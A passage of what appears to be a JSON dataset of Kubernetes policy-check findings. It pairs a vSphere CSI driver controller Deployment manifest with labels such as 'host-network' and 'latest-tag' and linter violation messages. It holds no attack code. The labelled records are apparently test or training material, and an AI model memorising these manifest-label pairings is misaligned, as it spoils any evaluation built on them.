  name: metrics-serving-cert\n      - name: csi-resizer\n        image: ${RESIZER_IMAGE}\n        args:\n        - --csi-address=$(ADDRESS)\n        - --http-endpoint=localhost:8204\n        - --v=${LOG_LEVEL}\n        env:\n        - name: ADDRESS\n          value: /var/lib/csi/sockets/pluginproxy/csi.sock\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /var/lib/csi/sockets/pluginproxy/\n        resources:\n          requests:\n            memory: 50Mi\n            cpu: 10m\n      - name: resizer-kube-rbac-proxy\n        args:\n        - --secure-listen-address=0.0.0.0:9204\n        - --upstream=http://127.0.0.1:8204/\n        - --tls-cert-file=/etc/tls/private/tls.crt\n        - --tls-private-key-file=/etc/tls/private/tls.key\n        - --logtostderr=true\n        image: ${KUBE_RBAC_PROXY_IMAGE}\n        imagePullPolicy: IfNotPresent\n        ports:\n        - containerPort: 9204\n          name: resizer-m\n          protocol: TCP\n        resources:\n          requests:\n            memory: 20Mi\n            cpu: 10m\n        volumeMounts:\n        - mountPath: /etc/tls/private\n          name: metrics-serving-cert\n      - name: csi-liveness-probe\n        image: ${LIVENESS_PROBE_IMAGE}\n        args:\n        - --csi-address=$(ADDRESS)\n        - --probe-timeout=3s\n        - --health-port=10301\n        env:\n        - name: ADDRESS\n          value: /var/lib/csi/sockets/pluginproxy/csi.sock\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /var/lib/csi/sockets/pluginproxy/\n        resources:\n          requests:\n            memory: 50Mi\n            cpu: 10m\n      - name: vsphere-syncer\n        image: ${VMWARE_VSPHERE_SYNCER_IMAGE}\n        args:\n        - --leader-election\n        - --fss-name=internal-feature-states.csi.vsphere.vmware.com\n        - --fss-namespace=$(CSI_NAMESPACE)\n        env:\n        - name: FULL_SYNC_INTERVAL_MINUTES\n          value: '30'\n        - name: VSPHERE_CSI_CONFIG\n          value: /etc/kubernetes/vsphere-csi-config/cloud.conf\n        - name: LOGGER_LEVEL\n          value: PRODUCTION\n        - name: INCLUSTER_CLIENT_QPS\n          value: '100'\n        - name: INCLUSTER_CLIENT_BURST\n          value: '100'\n        - name: CSI_NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        volumeMounts:\n        - mountPath: /etc/kubernetes/vsphere-csi-config\n          name: vsphere-csi-config-volume\n          readOnly: true\n      volumes:\n      - name: socket-dir\n        emptyDir: {}\n      - name: vsphere-csi-config-volume\n        configMap:\n          name: vsphere-csi-config\n      - name: metrics-serving-cert\n        secret:\n          secretName: vmware-vsphere-csi-driver-controller-metrics-serving-cert\n",
    "policy_id": "host-network",
    "violation_text": "resource shares host's network namespace (via hostNetwork=true)."
  },
  {
    "id": "8964",
    "manifest_path": "data/manifests/the_stack_sample/sample_3389.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: vmware-vsphere-csi-driver-controller\n  namespace: openshift-cluster-csi-drivers\n  annotations:\n    config.openshift.io/inject-proxy: csi-driver\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: vmware-vsphere-csi-driver-controller\n  template:\n    metadata:\n      labels:\n        app: vmware-vsphere-csi-driver-controller\n    spec:\n      serviceAccountName: vmware-vsphere-csi-driver-controller-sa\n      containers:\n      - name: csi-driver\n        image: ${DRIVER_IMAGE}\n        args:\n        - --fss-name=internal-feature-states.csi.vsphere.vmware.com\n        - --fss-namespace=$(CSI_NAMESPACE)\n        env:\n        - name: CSI_ENDPOINT\n          value: unix:///var/lib/csi/sockets/pluginproxy/csi.sock\n        - name: X_CSI_MODE\n          value: controller\n        - name: VSPHERE_CSI_CONFIG\n          value: /etc/kubernetes/vsphere-csi-config/cloud.conf\n        - name: LOGGER_LEVEL\n          value: PRODUCTION\n        - name: INCLUSTER_CLIENT_QPS\n          value: '100'\n        - name: INCLUSTER_CLIENT_BURST\n          value: '100'\n        - name: CSI_NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        - name: X_CSI_SERIAL_VOL_ACCESS_TIMEOUT\n          value: 3m\n        - name: X_CSI_SPEC_DISABLE_LEN_CHECK\n          value: 'true'\n        ports:\n        - name: healthz\n          containerPort: 10301\n          protocol: TCP\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /var/lib/csi/sockets/pluginproxy/\n        - name: vsphere-csi-config-volume\n          mountPath: /etc/kubernetes/vsphere-csi-config/\n          readOnly: true\n        resources:\n          requests:\n            memory: 50Mi\n            cpu: 10m\n      - name: csi-provisioner\n        image: ${PROVISIONER_IMAGE}\n        args:\n        - --csi-address=$(ADDRESS)\n        - --default-fstype=ext4\n        - --v=${LOG_LEVEL}\n        - --leader-election\n        - --http-endpoint=localhost:8202\n        env:\n        - name: ADDRESS\n          value: /var/lib/csi/sockets/pluginproxy/csi.sock\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /var/lib/csi/sockets/pluginproxy/\n        resources:\n          requests:\n            memory: 50Mi\n            cpu: 10m\n      - name: provisioner-kube-rbac-proxy\n        args:\n        - --secure-listen-address=0.0.0.0:9202\n        - --upstream=http://127.0.0.1:8202/\n        - --tls-cert-file=/etc/tls/private/tls.crt\n        - --tls-private-key-file=/etc/tls/private/tls.key\n        - --logtostderr=true\n        image: ${KUBE_RBAC_PROXY_IMAGE}\n        imagePullPolicy: IfNotPresent\n        ports:\n        - containerPort: 9202\n          name: provisioner-m\n          protocol: TCP\n        resources:\n          requests:\n            memory: 20Mi\n            cpu: 10m\n        volumeMounts:\n        - mountPath: /etc/tls/private\n          name: metrics-serving-cert\n      - name: csi-attacher\n        image: ${ATTACHER_IMAGE}\n        args:\n        - --csi-address=$(ADDRESS)\n        - --http-endpoint=localhost:8203\n        - --v=${LOG_LEVEL}\n        env:\n        - name: ADDRESS\n          value: /var/lib/csi/sockets/pluginproxy/csi.sock\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /var/lib/csi/sockets/pluginproxy/\n        resources:\n          requests:\n            memory: 50Mi\n            cpu: 10m\n      - name: attacher-kube-rbac-proxy\n        args:\n        - --secure-listen-address=0.0.0.0:9203\n        - --upstream=http://127.0.0.1:8203/\n        - --tls-cert-file=/etc/tls/private/tls.crt\n        - --tls-private-key-file=/etc/tls/private/tls.key\n        - --logtostderr=true\n        image: ${KUBE_RBAC_PROXY_IMAGE}\n        imagePullPolicy: IfNotPresent\n        ports:\n        - containerPort: 9203\n          name: attacher-m\n          protocol: TCP\n        resources:\n          requests:\n            memory: 20Mi\n            cpu: 10m\n        volumeMounts:\n        - mountPath: /etc/tls/private\n          name: metrics-serving-cert\n      - name: csi-resizer\n        image: ${RESIZER_IMAGE}\n        args:\n        - --csi-address=$(ADDRESS)\n        - --http-endpoint=localhost:8204\n        - --v=${LOG_LEVEL}\n        env:\n        - name: ADDRESS\n          value: /var/lib/csi/sockets/pluginproxy/csi.sock\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /var/lib/csi/sockets/pluginproxy/\n        resources:\n          requests:\n            memory: 50Mi\n            cpu: 10m\n      - name: resizer-kube-rbac-proxy\n        args:\n        - --secure-listen-address=0.0.0.0:9204\n        - --upstream=http://127.0.0.1:8204/\n        - --tls-cert-file=/etc/tls/private/tls.crt\n        - --tls-private-key-file=/etc/tls/private/tls.key\n        - --logtostderr=true\n        image: ${KUBE_RBAC_PROXY_IMAGE}\n        imagePullPolicy: IfNotPresent\n        ports:\n        - containerPort: 9204\n          name: resizer-m\n          protocol: TCP\n        resources:\n          requests:\n            memory: 20Mi\n            cpu: 10m\n        volumeMounts:\n        - mountPath: /etc/tls/private\n          name: metrics-serving-cert\n      - name: csi-liveness-probe\n        image: ${LIVENESS_PROBE_IMAGE}\n        args:\n        - --csi-address=$(ADDRESS)\n        - --probe-timeout=3s\n        - --health-port=10301\n        env:\n        - name: ADDRESS\n          value: /var/lib/csi/sockets/pluginproxy/csi.sock\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /var/lib/csi/sockets/pluginproxy/\n        resources:\n          requests:\n            memory: 50Mi\n            cpu: 10m\n      - name: vsphere-syncer\n        image: ${VMWARE_VSPHERE_SYNCER_IMAGE}\n        args:\n        - --leader-election\n        - --fss-name=internal-feature-states.csi.vsphere.vmware.com\n        - --fss-namespace=$(CSI_NAMESPACE)\n        env:\n        - name: FULL_SYNC_INTERVAL_MINUTES\n          value: '30'\n        - name: VSPHERE_CSI_CONFIG\n          value: /etc/kubernetes/vsphere-csi-config/cloud.conf\n        - name: LOGGER_LEVEL\n          value: PRODUCTION\n        - name: INCLUSTER_CLIENT_QPS\n          value: '100'\n        - name: INCLUSTER_CLIENT_BURST\n          value: '100'\n        - name: CSI_NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        volumeMounts:\n        - mountPath: /etc/kubernetes/vsphere-csi-config\n          name: vsphere-csi-config-volume\n          readOnly: true\n      volumes:\n      - name: socket-dir\n        emptyDir: {}\n      - name: vsphere-csi-config-volume\n        configMap:\n          name: vsphere-csi-config\n      - name: metrics-serving-cert\n        secret:\n          secretName: vmware-vsphere-csi-driver-controller-metrics-serving-cert\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"attacher-kube-rbac-proxy\" is using an invalid container image, \"${KUBE_RBAC_PROXY_IMAGE}\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "8965",
    "manifest_path": "data/manifests/the_stack_sample/sample_3389.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: vmware-vsphere-csi-driver-controller\n  namespace: openshift-cluster-csi-drivers\n  annotations:\n    config.openshift.io/inject-proxy: csi-driver\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: vmware-vsphere-csi-driver-controller\n  template:\n    metadata:\n      labels:\n        app: vmware-vsphere-csi-driver-controller\n    spec:\n      serviceAccountName: vmware-vsphere-csi-driver-controller-sa\n      containers:\n      - name: csi-driver\n        image: ${DRIVER_IMAGE}\n        args:\n        - --fss-name=internal-feature-states.csi.vsphere.vmware.com\n        - --fss-namespace=$(CSI_NAMESPACE)\n        env:\n        - name: CSI_ENDPOINT\n          value: unix:///var/lib/csi/sockets/pluginproxy/csi.sock\n        - name: X_CSI_MODE\n          value: controller\n        - name: VSPHERE_CSI_CONFIG\n          value: /etc/kubernetes/vsphere-csi-config/cloud.conf\n        - name: LOGGER_LEVEL\n          value: PRODUCTION\n        - name: INCLUSTER_CLIENT_QPS\n          value: '100'\n        - name: INCLUSTER_CLIENT_BURST\n          value: '100'\n        - name: CSI_NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        - name: X_CSI_SERIAL_VOL_ACCESS_TIMEOUT\n          value: 3m\n        - name: X_CSI_SPEC_DISABLE_LEN_CHECK\n          value: 'true'\n        ports:\n        - name: healthz\n          containerPort: 10301\n          protocol: TCP\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /var/lib/csi/sockets/pluginproxy/\n        - name: vsphere-csi-config-volume\n          mountPath: /etc/kubernetes/vsphere-csi-config/\n          readOnly: true\n        resources:\n          requests:\n            memory: 50Mi\n            cpu: 10m\n      - name: csi-provisioner\n        image: ${PROVISIONER_IMAGE}\n        args:\n        - --csi-address=$(ADDRESS)\n        - --default-fstype=ext4\n        - --v=${LOG_LEVEL}\n        - --leader-election\n        - --http-endpoint=localhost:8202\n        env:\n        - name: ADDRESS\n          value: /var/lib/csi/sockets/pluginproxy/csi.sock\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /var/lib/csi/sockets/pluginproxy/\n        resources:\n          requests:\n            memory: 50Mi\n            cpu: 10m\n      - name: provisioner-kube-rbac-proxy\n        args:\n        - --secure-listen-address=0.0.0.0:9202\n        - --upstream=http://127.0.0.1:8202/\n        - --tls-cert-file=/etc/tls/private/tls.crt\n        - --tls-private-key-file=/etc/tls/private/tls.key\n        - --logtostderr=true\n        image: ${KUBE_RBAC_PROXY_IMAGE}\n        imagePullPolicy: IfNotPresent\n        ports:\n        - containerPort: 9202\n          name: provisioner-m\n          protocol: TCP\n        resources:\n          requests:\n            memory: 20Mi\n            cpu: 10m\n        volumeMounts:\n        - mountPath: /etc/tls/private\n          name: metrics-serving-cert\n      - name: csi-attacher\n        image: ${ATTACHER_IMAGE}\n        args:\n        - --csi-address=$(ADDRESS)\n        - --http-endpoint=localhost:8203\n        - --v=${LOG_LEVEL}\n        env:\n        - name: ADDRESS\n          value: /var/lib/csi/sockets/pluginproxy/csi.sock\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /var/lib/csi/sockets/pluginproxy/\n        resources:\n          requests:\n            memory: 50Mi\n            cpu: 10m\n      - name: attacher-kube-rbac-proxy\n        args:\n        - --secure-listen-address=0.0.0.0:9203\n        - --upstream=http://127.0.0.1:8203/\n        - --tls-cert-file=/etc/tls/private/tls.crt\n        - --tls-private-key-file=/etc/tls/private/tls.key\n        - --logtostderr=true\n        image: ${KUBE_RBAC_PROXY_IMAGE}\n        imagePullPolicy: IfNotPresent\n        ports:\n        - containerPort: 9203\n          name: attacher-m\n          protocol: TCP\n        resources:\n          requests:\n            memory: 20Mi\n            cpu: 10m\n        volumeMounts:\n        - mountPath: /etc/tls/private\n          name: metrics-serving-cert\n      - name: csi-resizer\n        image: ${RESIZER_IMAGE}\n        args:\n        - --csi-address=$(ADDRESS)\n        - --http-endpoint=localhost:8204\n        - --v=${LOG_LEVEL}\n        env:\n        - name: ADDRESS\n          value: /var/lib/csi/sockets/pluginproxy/csi.sock\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /var/lib/csi/sockets/pluginproxy/\n        resources:\n          requests:\n            memory: 50Mi\n            cpu: 10m\n      - name: resizer-kube-rbac-proxy\n        args:\n        - --secure-listen-address=0.0.0.0:9204\n        - --upstream=http://127.0.0.1:8204/\n        - --tls-cert-file=/etc/tls/private/tls.crt\n        - --tls-private-key-file=/etc/tls/private/tls.key\n        - --logtostderr=true\n        image: ${KUBE_RBAC_PROXY_IMAGE}\n        imagePullPolicy: IfNotPresent\n        ports:\n        - containerPort: 9204\n          name: resizer-m\n          protocol: TCP\n        resources:\n          requests:\n            memory: 20Mi\n            cpu: 10m\n        volumeMounts:\n        - mountPath: /etc/tls/private\n          name: metrics-serving-cert\n      - name: csi-liveness-probe\n        image: ${LIVENESS_PROBE_IMAGE}\n        args:\n        - --csi-address=$(ADDRESS)\n        - --probe-timeout=3s\n        - --health-port=10301\n        env:\n        - name: ADDRESS\n          value: /var/lib/csi/sockets/pluginproxy/csi.sock\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /var/lib/csi/sockets/pluginproxy/\n        resources:\n          requests:\n            memory: 50Mi\n            cpu: 10m\n      - name: vsphere-syncer\n        image: ${VMWARE_VSPHERE_SYNCER_IMAGE}\n        args:\n        - --leader-election\n        - --fss-name=internal-feature-states.csi.vsphere.vmware.com\n        - --fss-namespace=$(CSI_NAMESPACE)\n        env:\n        - name: FULL_SYNC_INTERVAL_MINUTES\n          value: '30'\n        - name: VSPHERE_CSI_CONFIG\n          value: /etc/kubernetes/vsphere-csi-config/cloud.conf\n        - name: LOGGER_LEVEL\n          value: PRODUCTION\n        - name: INCLUSTER_CLIENT_QPS\n          value: '100'\n        - name: INCLUSTER_CLIENT_BURST\n          value: '100'\n        - name: CSI_NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        volumeMounts:\n        - mountPath: /etc/kubernetes/vsphere-csi-config\n          name: vsphere-csi-config-volume\n          readOnly: true\n      volumes:\n      - name: socket-dir\n        emptyDir: {}\n      - name: vsphere-csi-config-volume\n        configMap:\n          name: vsphere-csi-config\n      - name: metrics-serving-cert\n        secret:\n          secretName: vmware-vsphere-csi-driver-controller-metrics-serving-cert\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"csi-attacher\" is using an invalid container image, \"${ATTACHER_IMAGE}\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "8966",
    "manifest_path": "data/manifests/the_stack_sample/sample_3389.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: vmware-vsphere-csi-driver-controller\n  namespace: openshift-cluster-csi-drivers\n  annotations:\n    config.openshift.io/inject-proxy: csi-driver\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: vmware-vsphere-csi-driver-controller\n  template:\n    metadata:\n      labels:\n        app: vmware-vsphere-csi-driver-controller\n    spec:\n      serviceAccountName: vmware-vsphere-csi-driver-controller-sa\n      containers:\n      - name: csi-driver\n        image: ${DRIVER_IMAGE}\n        args:\n        - --fss-name=internal-feature-states.csi.vsphere.vmware.com\n        - --fss-namespace=$(CSI_NAMESPACE)\n        env:\n        - name: CSI_ENDPOINT\n          value: unix:///var/lib/csi/sockets/pluginproxy/csi.sock\n        - name: X_CSI_MODE\n          value: controller\n        - name: VSPHERE_CSI_CONFIG\n          value: /etc/kubernetes/vsphere-csi-config/cloud.conf\n        - name: LOGGER_LEVEL\n          value: PRODUCTION\n        - name: INCLUSTER_CLIENT_QPS\n          value: '100'\n        - name: INCLUSTER_CLIENT_BURST\n          value: '100'\n        - name: CSI_NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        - name: X_CSI_SERIAL_VOL_ACCESS_TIMEOUT\n          value: 3m\n        - name: X_CSI_SPEC_DISABLE_LEN_CHECK\n          value: 'true'\n        ports:\n        - name: healthz\n          containerPort: 10301\n          protocol: TCP\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /var/lib/csi/sockets/pluginproxy/\n        - name: vsphere-csi-config-volume\n          mountPath: /etc/kubernetes/vsphere-csi-config/\n          readOnly: true\n        resources:\n          requests:\n            memory: 50Mi\n            cpu: 10m\n      - name: csi-provisioner\n        image: ${PROVISIONER_IMAGE}\n        args:\n        - --csi-address=$(ADDRESS)\n        - --default-fstype=ext4\n        - --v=${LOG_LEVEL}\n        - --leader-election\n        - --http-endpoint=localhost:8202\n        env:\n        - name: ADDRESS\n          value: /var/lib/csi/sockets/pluginproxy/csi.sock\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /var/lib/csi/sockets/pluginproxy/\n        resources:\n          requests:\n            memory: 50Mi\n            cpu: 10m\n      - name: provisioner-kube-rbac-proxy\n        args:\n        - --secure-listen-address=0.0.0.0:9202\n        - --upstream=http://127.0.0.1:8202/\n        - --tls-cert-file=/etc/tls/private/tls.crt\n        - --tls-private-key-file=/etc/tls/private/tls.key\n        - --logtostderr=true\n        image: ${KUBE_RBAC_PROXY_IMAGE}\n        imagePullPolicy: IfNotPresent\n        ports:\n        - containerPort: 9202\n          name: provisioner-m\n          protocol: TCP\n        resources:\n          requests:\n            memory: 20Mi\n            cpu: 10m\n        volumeMounts:\n        - mountPath: /etc/tls/private\n          name: metrics-serving-cert\n      - name: csi-attacher\n        image: ${ATTACHER_IMAGE}\n        args:\n        - --csi-address=$(ADDRESS)\n        - --http-endpoint=localhost:8203\n        - --v=${LOG_LEVEL}\n        env:\n        - name: ADDRESS\n          value: /var/lib/csi/sockets/pluginproxy/csi.sock\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /var/lib/csi/sockets/pluginproxy/\n        resources:\n          requests:\n            memory: 50Mi\n            cpu: 10m\n      - name: attacher-kube-rbac-proxy\n        args:\n        - --secure-listen-address=0.0.0.0:9203\n        - --upstream=http://127.0.0.1:8203/\n        - --tls-cert-file=/etc/tls/private/tls.crt\n        - --tls-private-key-file=/etc/tls/private/tls.key\n        - --logtostderr=true\n        image: ${KUBE_RBAC_PROXY_IMAGE}\n        imagePullPolicy: IfNotPresent\n        ports:\n        - containerPort: 9203\n          name: attacher-m\n          protocol: TCP\n        resources:\n          requests:\n            memory: 20Mi\n            cpu: 10m\n        volumeMounts:\n        - mountPath: /etc/tls/private\n          name: metrics-serving-cert\n      - name: csi-resizer\n        image: ${RESIZER_IMAGE}\n        args:\n        - --csi-address=$(ADDRESS)\n        - --http-endpoint=localhost:8204\n        - --v=${LOG_LEVEL}\n        env:\n        - name: ADDRESS\n          value: /var/lib/csi/sockets/pluginproxy/csi.sock\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /var/lib/csi/sockets/pluginproxy/\n        resources:\n          requests:\n            memory: 50Mi\n            cpu: 10m\n      - name: resizer-kube-rbac-proxy\n        args:\n        - --secure-listen-address=0.0.0.0:9204\n        - --upstream=http://127.0.0.1:8204/\n        - --tls-cert-file=/etc/tls/private/tls.crt\n        - --tls-private-key-file=/etc/tls/private/tls.key\n        - --logtostderr=true\n        image: ${KUBE_RBAC_PROXY_IMAGE}\n        imagePullPolicy: IfNotPresent\n        ports:\n        - containerPort: 9204\n          name: resizer-m\n          protocol: TCP\n        resources:\n          requests:\n            memory: 20Mi\n            cpu: 10m\n        volumeMounts:\n        - mountPath: /etc/tls/private\n          name: metrics-serving-cert\n      - name: csi-liveness-probe\n        image: ${LIVENESS_PROBE_IMAGE}\n        args:\n        - --csi-address=$(ADDRESS)\n        - --probe-timeout=3s\n        - --health-port=10301\n        env:\n        - name: ADDRESS\n          value: /var/lib/csi/sockets/pluginproxy/csi.sock\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /var/lib/csi/sockets/pluginproxy/\n        resources:\n          requests:\n            memory: 50Mi\n            cpu: 10m\n      - name: vsphere-syncer\n        image: ${VMWARE_VSPHERE_SYNCER_IMAGE}\n        args:\n        - --leader-election\n        - --fss-name=internal-feature-states.csi.vsphere.vmware.com\n        - --fss-namespace=$(CSI_NAMESPACE)\n        env:\n        - name: FULL_SYNC_INTERVAL_MINUTES\n          value: '30'\n        - name: VSPHERE_CSI_CONFIG\n          value: /etc/kubernetes/vsphere-csi-config/cloud.conf\n        - name: LOGGER_LEVEL\n          value: PRODUCTION\n        - name: INCLUSTER_CLIENT_QPS\n          value: '100'\n        - name: INCLUSTER_CLIENT_BURST\n          value: '100'\n        - name: CSI_NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        volumeMounts:\n        - mountPath: /etc/kubernetes/vsphere-csi-config\n          name: vsphere-csi-config-volume\n          readOnly: true\n      volumes:\n      - name: socket-dir\n        emptyDir: {}\n      - name: vsphere-csi-config-volume\n        configMap:\n          name: vsphere-csi-config\n      - name: metrics-serving-cert\n        secret:\n          secretName: vmware-vsphere-csi-driver-controller-metrics-serving-cert\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"csi-driver\" is using an invalid container image, \"${DRIVER_IMAGE}\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "8967",
    "manifest_path": "data/manifests/the_stack_sample/sample_3389.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: vmware-vsphere-csi-driver-controller\n  namespace: openshift-cluster-csi-drivers\n  annotations:\n    config.openshift.io/inject-proxy: csi-driver\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: vmware-vsphere-csi-driver-controller\n  template:\n    metadata:\n      labels:\n        app: vmware-vsphere-csi-driver-controller\n    spec:\n      serviceAccountName: vmware-vsphere-csi-driver-controller-sa\n      containers:\n      - name: csi-driver\n        image: ${DRIVER_IMAGE}\n        args:\n        - --fss-name=internal-feature-states.csi.vsphere.vmware.com\n        - --fss-namespace=$(CSI_NAMESPACE)\n        env:\n        - name: CSI_ENDPOINT\n          value: unix:///var/lib/csi/sockets/pluginproxy/csi.sock\n        - name: X_CSI_MODE\n          value: controller\n        - name: VSPHERE_CSI_CONFIG\n          value: /etc/kubernetes/vsphere-csi-config/cloud.conf\n        - name: LOGGER_LEVEL\n          value: PRODUCTION\n        - name: INCLUSTER_CLIENT_QPS\n          value: '100'\n        - name: INCLUSTER_CLIENT_BURST\n          value: '100'\n        - name: CSI_NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        - name: X_CSI_SERIAL_VOL_ACCESS_TIMEOUT\n          value: 3m\n        - name: X_CSI_SPEC_DISABLE_LEN_CHECK\n          value: 'true'\n        ports:\n        - name: healthz\n          containerPort: 10301\n          protocol: TCP\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /var/lib/csi/sockets/pluginproxy/\n        - name: vsphere-csi-config-volume\n          mountPath: /etc/kubernetes/vsphere-csi-config/\n          readOnly: true\n        resources:\n          requests:\n            memory: 50Mi\n            cpu: 10m\n      - name: csi-provisioner\n        image: ${PROVISIONER_IMAGE}\n        args:\n        - --csi-address=$(ADDRESS)\n        - --default-fstype=ext4\n        - --v=${LOG_LEVEL}\n        - --leader-election\n        - --http-endpoint=localhost:8202\n        env:\n        - name: ADDRESS\n          value: /var/lib/csi/sockets/pluginproxy/csi.sock\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /var/lib/csi/sockets/pluginproxy/\n        resources:\n          requests:\n            memory: 50Mi\n            cpu: 10m\n      - name: provisioner-kube-rbac-proxy\n        args:\n        - --secure-listen-address=0.0.0.0:9202\n        - --upstream=http://127.0.0.1:8202/\n        - --tls-cert-file=/etc/tls/private/tls.crt\n        - --tls-private-key-file=/etc/tls/private/tls.key\n        - --logtostderr=true\n        image: ${KUBE_RBAC_PROXY_IMAGE}\n        imagePullPolicy: IfNotPresent\n        ports:\n        - containerPort: 9202\n          name: provisioner-m\n          protocol: TCP\n        resources:\n          requests:\n            memory: 20Mi\n            cpu: 10m\n        volumeMounts:\n        - mountPath: /etc/tls/private\n          name: metrics-serving-cert\n      - name: csi-attacher\n        image: ${ATTACHER_IMAGE}\n        args:\n        - --csi-address=$(ADDRESS)\n        - --http-endpoint=localhost:8203\n        - --v=${LOG_LEVEL}\n        env:\n        - name: ADDRESS\n          value: /var/lib/csi/sockets/pluginproxy/csi.sock\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /var/lib/csi/sockets/pluginproxy/\n        resources:\n          requests:\n            memory: 50Mi\n            cpu: 10m\n      - name: attacher-kube-rbac-proxy\n        args:\n        - --secure-listen-address=0.0.0.0:9203\n        - --upstream=http://127.0.0.1:8203/\n        - --tls-cert-file=/etc/tls/private/tls.crt\n        - --tls-private-key-file=/etc/tls/private/tls.key\n        - --logtostderr=true\n        image: ${KUBE_RBAC_PROXY_IMAGE}\n        imagePullPolicy: IfNotPresent\n        ports:\n        - containerPort: 9203\n          name: attacher-m\n          protocol: TCP\n        resources:\n          requests:\n            memory: 20Mi\n            cpu: 10m\n        volumeMounts:\n        - mountPath: /etc/tls/private\n          name: metrics-serving-cert\n      - name: csi-resizer\n        image: ${RESIZER_IMAGE}\n        args:\n        - --csi-address=$(ADDRESS)\n        - --http-endpoint=localhost:8204\n        - --v=${LOG_LEVEL}\n        env:\n        - name: ADDRESS\n          value: /var/lib/csi/sockets/pluginproxy/csi.sock\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /var/lib/csi/sockets/pluginproxy/\n        resources:\n          requests:\n            memory: 50Mi\n            cpu: 10m\n      - name: resizer-kube-rbac-proxy\n        args:\n        - --secure-listen-address=0.0.0.0:9204\n        - --upstream=http://127.0.0.1:8204/\n        - --tls-cert-file=/etc/tls/private/tls.crt\n        - --tls-private-key-file=/etc/tls/private/tls.key\n        - --logtostderr=true\n        image: ${KUBE_RBAC_PROXY_IMAGE}\n        imagePullPolicy: IfNotPresent\n        ports:\n        - containerPort: 9204\n          name: resizer-m\n          protocol: TCP\n        resources:\n          requests:\n            memory: 20Mi\n            cpu: 10m\n        volumeMounts:\n        - mountPath: /etc/tls/private\n          name: metrics-serving-cert\n      - name: csi-liveness-probe\n        image: ${LIVENESS_PROBE_IMAGE}\n        args:\n        - --csi-address=$(ADDRESS)\n        - --probe-timeout=3s\n        - --health-port=10301\n        env:\n        - name: ADDRESS\n          value: /var/lib/csi/sockets/pluginproxy/csi.sock\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /var/lib/csi/sockets/pluginproxy/\n        resources:\n          requests:\n            memory: 50Mi\n            cpu: 10m\n      - name: vsphere-syncer\n        image: ${VMWARE_VSPHERE_SYNCER_IMAGE}\n        args:\n        - --leader-election\n        - --fss-name=internal-feature-states.csi.vsphere.vmware.com\n        - --fss-namespace=$(CSI_NAMESPACE)\n        env:\n        - name: FULL_SYNC_INTERVAL_MINUTES\n          value: '30'\n        - name: VSPHERE_CSI_CONFIG\n          value: /etc/kubernetes/vsphere-csi-config/cloud.conf\n        - name: LOGGER_LEVEL\n          value: PRODUCTION\n        - name: INCLUSTER_CLIENT_QPS\n          value: '100'\n        - name: INCLUSTER_CLIENT_BURST\n          value: '100'\n        - name: CSI_NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        volumeMounts:\n        - mountPath: /etc/kubernetes/vsphere-csi-config\n          name: vsphere-csi-config-volume\n          readOnly: true\n      volumes:\n      - name: socket-dir\n        emptyDir: {}\n      - name: vsphere-csi-config-volume\n        configMap:\n          name: vsphere-csi-config\n      - name: metrics-serving-cert\n        secret:\n          secretName: vmware-vsphere-csi-driver-controller-metrics-serving-cert\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"csi-liveness-probe\" is using an invalid container image, \"${LIVENESS_PROBE_IMAGE}\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "8968",
    "manifest_path": "data/manifests/the_stack_sample/sample_3389.yaml",
